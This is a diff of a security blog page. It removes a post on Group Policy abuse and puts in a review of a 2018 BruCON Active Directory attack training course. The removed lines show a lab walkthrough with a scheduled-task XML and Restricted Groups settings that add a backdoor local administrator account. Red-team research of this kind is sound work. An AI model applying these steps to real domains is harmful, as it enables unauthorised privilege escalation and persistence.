@@ -23,7 +23,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.26">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
-    <title>GPO Abuse</title>
+    <title>Review: Active Directory Attacks for Red and Blue Teams</title>
     <meta name="author" content="Rasta Mouse">
     <meta name="keywords" content="">
 
@@ -31,25 +31,19 @@
     
 
     
-    <meta name="description" content="Intro
-
-Being able to write to a Group Policy Object affords you some interesting opportunities.  Depending on circumstance, it can either be used as a priv esc vector - e.g. if you control a GPO that is applied to machines that have higher privileged accounts logged on; or as a persistence mechanism to maintain access to those machines.
+    <meta name="description" content="Along with Cn33liz, I recently had the pleasure of assisting Nikhil Mittal with his 2018 BruCON spring training: Active Directory Attacks for Red and Blue Teams.
 
 ">
-    <meta property="og:description" content="Intro
-
-Being able to write to a Group Policy Object affords you some interesting opportunities.  Depending on circumstance, it can either be used as a priv esc vector - e.g. if you control a GPO that is applied to machines that have higher privileged accounts logged on; or as a persistence mechanism to maintain access to those machines.
+    <meta property="og:description" content="Along with Cn33liz, I recently had the pleasure of assisting Nikhil Mittal with his 2018 BruCON spring training: Active Directory Attacks for Red and Blue Teams.
 
 ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="GPO Abuse">
-    <meta property="og:url" content="/2018/04/gpo-abuse/">
+    <meta property="og:title" content="Review: Active Directory Attacks for Red and Blue Teams">
+    <meta property="og:url" content="/2018/05/review-active-directory-attacks-for-red-and-blue-teams/">
     <meta property="og:site_name" content="Rasta Mouse">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Rasta Mouse">
-    <meta name="twitter:description" content="Intro
-
-Being able to write to a Group Policy Object affords you some interesting opportunities.  Depending on circumstance, it can either be used as a priv esc vector - e.g. if you control a GPO that is applied to machines that have higher privileged accounts logged on; or as a persistence mechanism to maintain access to those machines.
+    <meta name="twitter:description" content="Along with Cn33liz, I recently had the pleasure of assisting Nikhil Mittal with his 2018 BruCON spring training: Active Directory Attacks for Red and Blue Teams.
 
 ">
     
@@ -65,7 +59,7 @@ Being able to write to a Group Policy Object affords you some interesting opport
     
 
     
-      <meta property="og:image" content="https://rastamouse.me/images/gpo/thumb.png">
+      <meta property="og:image" content="https://rastamouse.me/images/brucon-18/brucon.png">
     
     
     
@@ -269,18 +263,18 @@ ga('send', 'pageview');
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      GPO Abuse
+      Review: Active Directory Attacks for Red and Blue Teams
     </h1>
   
   <div class="postShorten-meta post-meta">
   
-    <time itemprop="datePublished" datetime="2018-04-07T00:00:00Z">
+    <time itemprop="datePublished" datetime="2018-05-05T00:00:00Z">
       
   
   
   
   
-    7 April 2018
+    5 May 2018
   
 
     </time>
@@ -301,215 +295,89 @@ ga('send', 'pageview');
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <h2 id="intro">Intro</h2>
-
-<p>Being able to write to a Group Policy Object affords you some interesting opportunities.  Depending on circumstance, it can either be used as a priv esc vector - e.g. if you control a GPO that is applied to machines that have higher privileged accounts logged on; or as a persistence mechanism to maintain access to those machines.</p>
+              <p>Along with <a href="https://twitter.com/Cneelis">Cn33liz</a>, I recently had the pleasure of assisting <a href="https://twitter.com/nikhil_mitt">Nikhil Mittal</a> with his 2018 BruCON spring training: Active Directory Attacks for Red and Blue Teams.</p>
 
 <p></p>
 
-<p><a href="https://twitter.com/_wald0">Andy Robbins</a> gives a brilliant overview in his <a href="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e">A Red Teamer’s Guide to GPOs and OUs</a> article, and highlights several abuse primitives that we should consider.</p>
+<p>This 3-day course is aimed towards attacking modern AD environments - focusing on abusing misconfigured enterprise applications like Jenkins; and leveraging native tools such as PowerShell and other trusted OS resources to carry out post-exploitation activities.</p>
 
-<p>The bit we&rsquo;re currently missing is an effective method of weaponising these ideas, outside of being able to use the Group Policy Management Console.</p>
+<p>Nikhil covers a wide range of topics, including:</p>
 
-<p><a href="https://twitter.com/harmj0y">Will Schroeder</a> made some ground when he published <a href="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/">Abusing GPO Permissions</a> and implemented <code>New-GPOImmediateTask</code> into <code>PowerView</code>.</p>
+<ul>
+<li>AD &amp; PowerShell basics</li>
+<li>Domain enumeration &amp; mapping
 
-<p>Let&rsquo;s take this as a bit of a case study, and see if we can build on the work&hellip;</p>
+<ul>
+<li>PowerView</li>
+<li>BloodHound</li>
+</ul></li>
+<li>Privilege Escalation
 
-<h2 id="scheduled-tasks">Scheduled Tasks</h2>
+<ul>
+<li>PowerUp</li>
+<li>Jenkins</li>
+<li>Credential theft (Mimikatz)</li>
+</ul></li>
+<li>Kerberos Attacks
 
-<p>First, we will want to create a new GPO and link it to our test OU.</p>
+<ul>
+<li>Golden &amp; Silver tickets</li>
+<li>Kerberoasting</li>
+<li>Kerberos Pre-Auth</li>
+<li>Delegation</li>
+</ul></li>
+<li>Domain &amp; Forest trusts
 
-<pre><code class="language-text">PS C:\&gt; New-GPO -Name &quot;Demo GPO&quot; | New-GPLink -Target &quot;OU=Workstations,DC=testlab,DC=local&quot;
+<ul>
+<li>Child -&gt; Parent</li>
+<li>X-Forest</li>
+</ul></li>
+<li>MSSQL Server Database links</li>
+<li>Credential abuse
 
-GpoId       : 811e863b-1be4-498e-bc0e-c29fb11af99a
-DisplayName : Demo GPO
-Enabled     : True
-Enforced    : False
-Target      : OU=Workstations,DC=testlab,DC=local
-Order       : 1
-</code></pre>
+<ul>
+<li>PTH &amp; Over-PTH</li>
+<li>Token Manipulation</li>
+</ul></li>
+<li>Persistence
 
-<p>Create a new <code>Immediate Task</code> in <code>Computer Configuration &gt; Preferences &gt; Control Panel Settings &gt; Scheduled Tasks</code>.  In this example, we&rsquo;ll create an action to add a new local user account and add it to the local administrators group.</p>
+<ul>
+<li>Skeleton Keys</li>
+<li>DCShadow</li>
+<li>Directory Services Restore Mode</li>
+<li>Security Support Provider</li>
+<li>AdminSDHolder</li>
+<li>ACLs &amp; Security Descriptors</li>
+</ul></li>
+<li>Bypassing Defence
 
+<ul>
+<li>AppLocker</li>
+<li>ATA</li>
+</ul></li>
+</ul>
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/gpo/evil-task.png" />
-    
-    
-</figure>
+<p>The course material is a combination of lecture, demos and hands-on exercises.  For the majority of topics we cover the theory, show a demo, then allow the students some time to try it out in the lab.  The lab is a large, multi-forest environment which is full of the vulnerabilities discussed in the class.  Each student receives a VPN key and credentials to their own instance of Windows 10, from which to launch their attacks on the forest.</p>
 
+<p>Some areas of the lab are secured a little more than others - e.g. Applocker, just to introduce a bit of challenge and variety :)</p>
 
-<p>Force a GPO update and verify the task was triggered.</p>
+<p>The course covers a lot of material and consequently, a number of students may find they need more time with the hands-on to wrap their head around the various subjects.  Unfortunately in order to keep to schedule, we sometimes just have to move on.  The saving grace, is that every student is allowed to retain:</p>
 
-<pre><code class="language-text">PS C:\&gt; gpupdate /target:computer /force
-Updating policy...
+<ul>
+<li>All the course materials, including slides and lab handouts.</li>
+<li>VPN access to the lab for 1 month after the course.</li>
+</ul>
 
-Computer Policy update has completed successfully.
-</code></pre>
+<p>So this gives each student plenty of time to re-visit any and all exercises they wish.</p>
 
-<pre><code class="language-text">PS C:\&gt; net user
+<p>In terms of balance, the content is delivered more from the red perspective than blue.  If you&rsquo;re on the offensive side, you&rsquo;ll (hopefully) pick up a bunch of new tricks for your engagements and gain some understanding of the artefacts and logs you leave behind.  Defenders will gain a deeper understanding of how the red guys are operating and methods of detecting their activity.</p>
 
-User accounts for \\WKSTN01
-
--------------------------------------------------------------------------------
-Administrator            DefaultAccount           Guest
-hax0r
-The command completed successfully.
-</code></pre>
-
-<pre><code class="language-text">
-
-PS C:\&gt; net localgroup administrators
-Alias name     administrators
-Comment        Administrators have complete and unrestricted access to the computer/domain
-
-Members
-
--------------------------------------------------------------------------------
-Administrator
-hax0r
-LAB\Domain Admins
-The command completed successfully.
-</code></pre>
-
-<h3 id="behind-the-magician-s-curtain">Behind the Magician&rsquo;s Curtain</h3>
-
-<p>If we have a look inside the SYSVOL directory for this GPO, we can see that it actually created <code>ScheduledTasks.xml</code> within <code>\Machine\Preferences\ScheduledTasks</code>.</p>
-
-<pre><code class="language-text">PS C:\&gt; ls &quot;\\testlab.local\sysvol\testlab.local\Policies\{811E863B-1BE4-498E-BC0E-C29FB11AF99A}\Machine\Preferences\ScheduledTasks\&quot;
-
-    Directory:
-    \\dc01\sysvol\testlab.local\Policies\{811E863B-1BE4-498E-BC0E-C29FB11AF99A}\Machine\Preferences\ScheduledTasks
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----       10/04/2018     20:06           1832 ScheduledTasks.xml
-</code></pre>
-
-<p>It doesn&rsquo;t actually look like this, but I&rsquo;ve cleaned it up to look more readable (if you can believe it).</p>
-
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-
-&lt;ScheduledTasks clsid=&quot;{CC63F200-7309-4ba0-B154-A71CD118DBCC}&quot;&gt;
-    &lt;ImmediateTaskV2 clsid=&quot;{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}&quot; name=&quot;Evil Task&quot; image=&quot;0&quot; changed=&quot;2018-04-10 19:06:58&quot; uid=&quot;{66305D26-9F45-445E-86B7-F945578F4746}&quot;&gt;
-        &lt;Properties action=&quot;C&quot; name=&quot;Evil Task&quot; runAs=&quot;NT AUTHORITY\System&quot; logonType=&quot;S4U&quot;&gt;
-            &lt;Task version=&quot;1.3&quot;&gt;
-                &lt;RegistrationInfo&gt;
-                    &lt;Author&gt;LAB\rastamouse&lt;/Author&gt;
-                    &lt;Description&gt;&lt;/Description&gt;
-                &lt;/RegistrationInfo&gt;
-                &lt;Principals&gt;
-                    &lt;Principal id=&quot;Author&quot;&gt;
-                        &lt;UserId&gt;NT AUTHORITY\System&lt;/UserId&gt;
-                        &lt;LogonType&gt;S4U&lt;/LogonType&gt;
-                        &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
-                    &lt;/Principal&gt;
-                &lt;/Principals&gt;
-                &lt;Settings&gt;
-                    &lt;IdleSettings&gt;
-                        &lt;Duration&gt;PT10M&lt;/Duration&gt;
-                        &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
-                        &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
-                        &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
-                    &lt;/IdleSettings&gt;
-                    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
-                    &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;
-                    &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;
-                    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;
-                    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
-                    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
-                    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
-                    &lt;Enabled&gt;true&lt;/Enabled&gt;
-                    &lt;Hidden&gt;false&lt;/Hidden&gt;
-                    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
-                    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
-                    &lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;
-                    &lt;Priority&gt;7&lt;/Priority&gt;
-                    &lt;DeleteExpiredTaskAfter&gt;PT0S&lt;/DeleteExpiredTaskAfter&gt;
-                &lt;/Settings&gt;
-                &lt;Triggers&gt;
-                    &lt;TimeTrigger&gt;
-                        &lt;StartBoundary&gt;%LocalTimeXmlEx%&lt;/StartBoundary&gt;
-                        &lt;EndBoundary&gt;%LocalTimeXmlEx%&lt;/EndBoundary&gt;
-                        &lt;Enabled&gt;true&lt;/Enabled&gt;
-                    &lt;/TimeTrigger&gt;
-                &lt;/Triggers&gt;
-                &lt;Actions Context=&quot;Author&quot;&gt;
-                    &lt;Exec&gt;
-                        &lt;Command&gt;c:\windows\system32\cmd.exe&lt;/Command&gt;
-                        &lt;Arguments&gt;/c &quot;net user hax0r Passw0rd! /add &amp;amp;&amp;amp; net localgroup administrators hax0r /add&quot;&lt;/Arguments&gt;
-                    &lt;/Exec&gt;
-                &lt;/Actions&gt;
-            &lt;/Task&gt;
-        &lt;/Properties&gt;
-    &lt;/ImmediateTaskV2&gt;
-&lt;/ScheduledTasks&gt;
-</code></pre>
-
-<p>Going back and reviewing the <code>PowerView</code> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L6587">source</a> for <code>New-GPOImmediateTask</code> - we can see that it uses a similar XML template and <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L6616">writes</a> it into the same path as we observed.</p>
-
-<h2 id="going-further">Going Further</h2>
-
-<p>So the basic methodolgy here is to make a GPO modification in the GPMC, see what files get dropped into SYSVOL and reverse engineer them.  Let&rsquo;s use <code>Restricted Groups</code> as another example.</p>
-
-<p>This is found in <code>Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Restricted Groups</code> and allows you to manipulate localgroup membership.  One possibility is to add a domain account to the local admin group.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/gpo/restricted-groups.png" />
-    
-    
-</figure>
-
-
-<p>Or if you were a little crazy, make any authenticated user a local admin&hellip;</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/gpo/restricted-groups-2.png" />
-    
-    
-</figure>
-
-
-<p>This particular configuration creates <code>GptTmpl.inf</code> in <code>\Machine\Microsoft\Windows NT\SecEdit\</code>.</p>
-
-<pre><code class="language-text">PS C:\&gt; cat &quot;\\testlab.local\sysvol\testlab.local\Policies\{811E863B-1BE4-498E-BC0E-C29FB11AF99A}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf&quot;
-
-[Unicode]
-Unicode=yes
-[Version]
-signature=&quot;$CHICAGO$&quot;
-Revision=1
-[Group Membership]
-*S-1-5-32-544__Memberof =
-*S-1-5-32-544__Members = *S-1-5-21-1078383433-4142403703-1311514137-1105
-</code></pre>
-
-<p>Where <code>S-1-5-32-544</code> is the SID of the local admin group and <code>S-1-5-21-1078383433-4142403703-1311514137-1105</code> is the SID of my <code>LAB\backdoor</code> user account.</p>
-
-<p>I have a conservative list of others I&rsquo;ve looked at thus far in my <a href="https://github.com/rasta-mouse/GPO-Abuse">GPO Abuse Repo</a>.</p>
+<p>If you have the opportunity to attend the course, I would highly recommend it.</p>
               
             </div>
           </div>
           <div id="post-footer" class="post-footer main-content-wrap">
             
-              
-                
-                
-                  <div class="post-footer-tags">
-                    <span class="text-color-light text-small">TAGGED IN</span><br/>
-                    
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/gpo/">gpo</a>
-
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/active-directory/">active directory</a>
-
-                  </div>
-                
               
             
             <div class="post-actions-wrap">
@@ -543,17 +411,17 @@ Revision=1
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f05%2freview-active-directory-attacks-for-red-and-blue-teams%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f05%2freview-active-directory-attacks-for-red-and-blue-teams%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f05%2freview-active-directory-attacks-for-red-and-blue-teams%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -624,17 +492,17 @@ Revision=1
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f05%2freview-active-directory-attacks-for-red-and-blue-teams%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f05%2freview-active-directory-attacks-for-red-and-blue-teams%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f05%2freview-active-directory-attacks-for-red-and-blue-teams%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -661,17 +529,17 @@ Revision=1
       <div id="share-options-bar" class="share-options-bar" data-behavior="4">
   <ul class="share-options">
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f05%2freview-active-directory-attacks-for-red-and-blue-teams%2f">
         <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f05%2freview-active-directory-attacks-for-red-and-blue-teams%2f">
         <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f05%2freview-active-directory-attacks-for-red-and-blue-teams%2f">
         <i class="fa fa-twitter"></i><span>Share on Twitter</span>
       </a>
     </li>
@@ -731,17 +599,15 @@ Revision=1
           <div class="media">
             
             <div class="media-body">
-              <a class="link-unstyled" href="https://rastamouse.me/2018/04/gpo-abuse/">
-                <h3 class="media-heading">GPO Abuse</h3>
+              <a class="link-unstyled" href="https://rastamouse.me/2018/05/review-active-directory-attacks-for-red-and-blue-teams/">
+                <h3 class="media-heading">Review: Active Directory Attacks for Red and Blue Teams</h3>
               </a>
               <span class="media-meta">
                 <span class="media-date text-small">
-                  Apr 4, 2018
+                  May 5, 2018
                 </span>
               </span>
-              <div class="media-content hide-xs font-merryweather"><h2 id="intro">Intro</h2>
-
-<p>Being able to write to a Group Policy Object affords you some interesting opportunities.  Depending on circumstance, it can either be used as a priv esc vector - e.g. if you control a GPO that is applied to machines that have higher privileged accounts logged on; or as a persistence mechanism to maintain access to those machines.</p>
+              <div class="media-content hide-xs font-merryweather"><p>Along with <a href="https://twitter.com/Cneelis">Cn33liz</a>, I recently had the pleasure of assisting <a href="https://twitter.com/nikhil_mitt">Nikhil Mittal</a> with his 2018 BruCON spring training: Active Directory Attacks for Red and Blue Teams.</p>
 
 <p></p></div>
             </div>
@@ -979,9 +845,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/rastamouse.me\/2018\/04\/gpo-abuse\/';
+          this.page.url = 'https:\/\/rastamouse.me\/2018\/05\/review-active-directory-attacks-for-red-and-blue-teams\/';
           
-            this.page.identifier = '\/2018\/04\/gpo-abuse\/'
+            this.page.identifier = '\/2018\/05\/review-active-directory-attacks-for-red-and-blue-teams\/'
           
         };
         (function() {
